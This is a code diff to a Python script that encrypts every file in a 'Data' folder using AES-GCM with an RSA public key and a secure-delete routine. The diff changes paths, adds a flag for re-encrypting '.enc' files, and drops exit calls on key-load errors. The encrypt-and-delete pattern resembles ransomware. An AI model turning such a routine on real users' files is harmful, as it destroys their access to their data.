@@ -3,8 +3,9 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
-DATA_FOLDER = "../Data"
-PUBLIC_KEY_FILE = "asym_public_key.pem"
+BASE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+DATA_FOLDER = os.path.join(BASE_PATH, "Data")
+PUBLIC_KEY_FILE = os.path.join(os.path.dirname(__file__), "asym_public_key.pem")
 
 def load_rsa_public_key():
     try:
@@ -14,10 +15,9 @@ def load_rsa_public_key():
         return public_key
     except FileNotFoundError:
         print(f"[ERROR] {PUBLIC_KEY_FILE} not found!")
-        exit()
+        
     except Exception as e:
         print(f"[ERROR] Failed to load RSA key: {e}")
-        exit()
 
 
 def secure_delete(path):
@@ -79,7 +79,7 @@ def encrypt_file(filepath, filename, public_key):
         print(f"[ERROR] Encryption failed for {filename}: {e}")
 
 
-def encrypt_all_files(public_key):
+def encrypt_all_files(public_key, skip_encrypted):
     try:
         if not os.path.exists(DATA_FOLDER):
             print(f"[!] '{DATA_FOLDER}' folder missing.")
@@ -95,9 +95,9 @@ def encrypt_all_files(public_key):
         print(f"\n=== Encrypting all files in '{DATA_FOLDER}/' ===")
 
         for filename in files:
-            if filename.endswith(".enc"):
+            if filename.endswith(".enc") and skip_encrypted:
                 print(f"[!] Skipping already encrypted file: {filename}")
-                continue
+                continue  
 
             filepath = os.path.join(DATA_FOLDER, filename)
             encrypt_file(filepath, filename, public_key)
@@ -109,7 +109,6 @@ def encrypt_all_files(public_key):
 
     except Exception as e:
         print(f"[FATAL ERROR] Unexpected problem: {e}")
-        exit()
 
 
 if __name__ == "__main__":
